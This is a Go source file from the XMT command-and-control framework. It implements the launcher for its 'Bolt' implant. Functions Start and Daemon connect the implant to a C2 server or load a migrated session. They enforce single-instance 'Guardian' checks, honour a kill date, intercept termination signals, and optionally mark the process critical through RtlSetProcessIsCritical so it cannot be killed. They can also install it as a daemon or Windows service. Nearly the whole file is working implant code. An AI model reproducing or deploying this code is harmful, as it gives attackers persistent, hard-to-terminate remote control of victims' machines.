// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Package bolt contains the functions for launching a Bolt instance.
package bolt

import (
	"context"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Start attempts to create a Bolt instance with the supplied arguments.
//
// This function will block and will NOT return (it calls 'device.GoExit').
//
// Arguments:
//
//	ignore     - If True, this will ignore any currently existing Guardians with
//	              the same guard name.
//	load       - If True, this Bolt will look to see if it's being launched as a
//	              Spawn/Migrate callable. This will use the supplied 'pipe' argument
//	              to look for (This is the 'pipe' argument passed to spawn/migrate).
//	critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//	              (Windows only obviously). And will make itself un-terminatable
//	              while running.
//	guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
//	              reasoning for this is the default behavior will cause multiple
//	              Bolts to be created if WorkHours are set and a Flurry is attempting
//	              to start a Bolt on non-work hours (as Connect will block until
//	              work hours allow it to connect).
//	l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
//	guard      - String name for the Guardian to look for/create. DO NOT FORMAT
//	              THIS NAME, it will be formatted based on the Linker type.
//	pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
//	              a non-formatted name to be passed to any Spawn/Migrate commands.
//	c          - Packed Config. The resulting profile will be build when the function
//	              starts and will silently return if it fails.
func Start(ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe string, c cfg.Config) {
	defer func() {
		if err := recover(); err != nil {
			device.GoExit()
		}
	}()
	p, err := c.Build()
	if err != nil {
		return
	}
	// If we have a killdate that's after now, quit.
	if k := p.KillDate(); k != nil && !k.IsZero() && time.Now().After(*k) {
		device.GoExit()
	}
	var (
		x, f = context.WithCancel(context.Background())
		s    *c2.Session
	)
	if load {
		if s, _ = c2.LoadContext(x, logger, pipe, time.Millisecond*500); s != nil && len(guard) > 0 {
			go func() {
				time.Sleep(time.Second * time.Duration(2+uint64(util.FastRandN(3))))
				man.GuardContext(x, l, guard)
			}()
		}
	}
	if s == nil {
		if len(guard) > 0 && man.Check(l, guard) && !ignore {
			f()
			return
		}
		if guardfirst && len(guard) > 0 {
			man.GuardContext(x, l, guard)
		}
		if s, _ = c2.ConnectContext(x, logger, p); s == nil {
			f()
			return
		}
		if !guardfirst && len(guard) > 0 {
			man.GuardContext(x, l, guard)
		}
	}
	limits.Ignore()
	limits.MemorySweep(x)
	var (
		w = make(chan os.Signal, 1)
		z bool
	)
	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); critical {
		z, _ = device.SetCritical(true)
	}
	select {
	case <-w:
	case <-x.Done():
	case <-s.Done():
	}
	f()
	if s.Close(); critical && !z {
		device.SetCritical(false)
	}
	// NOTE(dij): Give some cleanup time to handle any loose ends. (1.5s)
	time.Sleep(1500000000)
	limits.Reset()
	limits.StopNotify(w)
	close(w)
	device.GoExit()
}

// Daemon attempts to create a Bolt instance with the supplied arguments as a *nix
// daemon or a Windows service. This function will until it receives a SIGINT or
// SIGTERM to shut down safely. (or a ServiceStop message in the case of Windows)
//
// This function will block and will NOT return (it calls 'device.GoExit').
//
// Arguments:
//
//	name       - The service name when running under Windows. This may empty as it
//	              is ignored under *nix.
//	ignore     - If True, this will ignore any currently existing Guardians with
//	              the same guard name.
//	load       - If True, this Bolt will look to see if it's being launched as a
//	              Spawn/Migrate callable. This will use the supplied 'pipe' argument
//	              to look for (This is the 'pipe' argument passed to spawn/migrate).
//	critical   - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//	              (Windows only obviously). And will make itself un-terminatable
//	              while running.
//	guardfirst - If True, enable the Guarding BEFORE attempting to connect. The
//	              reasoning for this is the default behavior will cause multiple
//	              Bolts to be created if WorkHours are set and a Flurry is attempting
//	              to start a Bolt on non-work hours (as Connect will block until
//	              work hours allow it to connect).
//	l          - Guardian Linker type to use. If nil, will default to 'Pipe'.
//	guard      - String name for the Guardian to look for/create. DO NOT FORMAT
//	              THIS NAME, it will be formatted based on the Linker type.
//	pipe       - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
//	              a non-formatted name to be passed to any Spawn/Migrate commands.
//	c          - Packed Config. The resulting profile will be build when the function
//	              starts and will silently return if it fails.
func Daemon(name string, ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe string, c cfg.Config) {
	p, err := c.Build()
	if err != nil {
		return
	}
	device.Daemon(name, func(x context.Context) error {
		return daemonFunc(x, ignore, load, critical, guardfirst, l, guard, pipe, p)
	})
	device.GoExit()
}
func daemonFunc(x context.Context, ignore, load, critical, guardfirst bool, l man.Linker, guard, pipe string, p cfg.Profile) error {
	// If we have a killdate that's after now, quit.
	if k := p.KillDate(); k != nil && !k.IsZero() && time.Now().After(*k) {
		return device.ErrQuit
	}
	var s *c2.Session
	if load {
		if s, _ = c2.LoadContext(x, logger, pipe, time.Millisecond*500); s != nil && len(guard) > 0 {
			go func() {
				time.Sleep(time.Second * time.Duration(1+uint64(util.FastRandN(3))))
				man.GuardContext(x, l, guard)
			}()
		}
	}
	if s == nil {
		if len(guard) > 0 && man.Check(l, guard) && !ignore {
			return nil
		}
		if guardfirst && len(guard) > 0 {
			man.GuardContext(x, l, guard)
		}
		if s, _ = c2.ConnectContext(x, logger, p); s == nil {
			return nil
		}
		if !guardfirst && len(guard) > 0 {
			man.GuardContext(x, l, guard)
		}
	}
	var (
		y, f = context.WithCancel(x)
		w    = make(chan os.Signal, 1)
		z    bool
	)
	limits.Ignore()
	limits.MemorySweep(y)
	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); critical {
		z, _ = device.SetCritical(true)
	}
	select {
	case <-w:
	case <-x.Done():
	case <-y.Done():
	case <-s.Done():
	}
	if s.Close(); critical && !z {
		device.SetCritical(false)
	}
	// NOTE(dij): Give some cleanup time to handle any loose ends. (1.5s)
	time.Sleep(1500000000)
	limits.Reset()
	limits.StopNotify(w)
	close(w)
	f()
	return nil
}
